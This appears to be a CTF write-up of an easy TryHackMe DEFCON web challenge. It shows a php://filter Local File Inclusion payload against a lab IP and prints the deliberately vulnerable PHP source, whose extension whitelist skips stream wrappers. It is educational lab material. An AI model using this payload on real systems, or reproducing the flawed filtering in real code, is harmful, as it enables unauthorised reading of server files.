---
title: "Tryhackme: Over the Jackpot CTF"
description: "THM Defcon CTF Event - Lost fortune included"
date: 2026-08-09
image:
  path: /assets/jackpot.jpg
  alt: "OvertheJackpot"
author: vu1n
layout: post
categories: [Tryhackme]
tags: [Tryhackme, LFI, ctf, DEFCON]
---

Lost Fortune Included is an easy-level CTF challenge from the TryHackMe DEFCON CTF event. The challenge involves exploiting a Local File Inclusion (LFI) vulnerability through PHP stream wrappers

## 1. Initial Reconnaissance

During the initial reconnaissance, the homepage reveals two available documents. Clicking on either document sends a request using the doc parameter:
1. http://10.49.132.206/?doc=important.png
2. http://10.49.132.206/?doc=village_schedule.pdf

![Jackpot home](https://raw.githubusercontent.com/0xvu1n/0xvu1n.github.io/refs/heads/main/assets/jackpothome.png)

The doc parameter is vulnerable to Local File Inclusion (LFI). To understand how the application handles the supplied file path and what filtering mechanisms are implemented, we can attempt to read index.php using the PHP filter wrapper:

http://10.49.132.206/?doc=php://filter/resource=index.php

The PHP wrapper allows us to retrieve the source code of index.php, revealing the following logic:
```
<?php
$doc = isset($_GET['doc']) ? $_GET['doc'] : '';

$decoys = ['village_schedule.pdf', 'important.png'];

// If a doc param was sent, serve it (this is the vulnerable path)
if ($doc !== '') {

    // stage 1: naive single-pass traversal strip
    $doc = str_replace('../', '', $doc);

    $base = __DIR__ . '/village_docs/';
    $is_wrapper = (strpos($doc, '://') !== false);

    if (!$is_wrapper) {
        // stage 2: extension whitelist, only ever applied to plain filenames
        if (stripos($doc, '.pdf') === false && stripos($doc, '.png') === false) {
            http_response_code(403);
            die('Only .pdf and .png village documents may be viewed.');
        }
        $path = (isset($doc[0]) && $doc[0] === '/') ? $doc : $base . $doc;
    } else {
        // wrapper protocols were never covered by the whitelist check above
        $path = $doc;
    }

    header('Content-Type: application/octet-stream');
    header('Content-Disposition: inline; filename="' . basename($doc) . '"');
    readfile($path);
    exit;
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>VILLAGE ARCHIVE TERMINAL v2.3</title>
</head>
<body>
<div class="terminal">
    <h1>&gt; Secret Village Archive Terminal</h1>
    <p class="tagline">village kiosk // read-only access</p>
    <p>Welcome, attendee. This kiosk serves talk decks and vendor flyers for the village.</p>

    <div class="prompt">AVAILABLE DOCUMENTS:</div>
    <ul>
        <?php foreach ($decoys as $d): ?>
        <li><a href="?doc=<?php echo urlencode($d); ?>"><?php echo htmlspecialchars($d); ?></a></li>
        <?php endforeach; ?>
    </ul>

    <div class="footer">
        Request format: <code>?doc=&lt;filename&gt;</code><br>
        Only .pdf and .png documents are served from this terminal.
    </div>
</div>
</body>
</html>

```

## 2. Exploitation

This means PHP wrappers such as php://filter can bypass the intended file restrictions.
The application removes the ../ traversal sequence, making a traditional LFI payload ineffective.


However, because PHP stream wrappers are not covered by the extension whitelist, 
we can use the php://filter wrapper to read arbitrary local files that PHP can access.


The request can be sent directly through the browser or intercepted and modified using a web proxy such as Burp Suite.

![Jackpot flag](https://raw.githubusercontent.com/0xvu1n/0xvu1n.github.io/refs/heads/main/assets/jackpotflag.png)
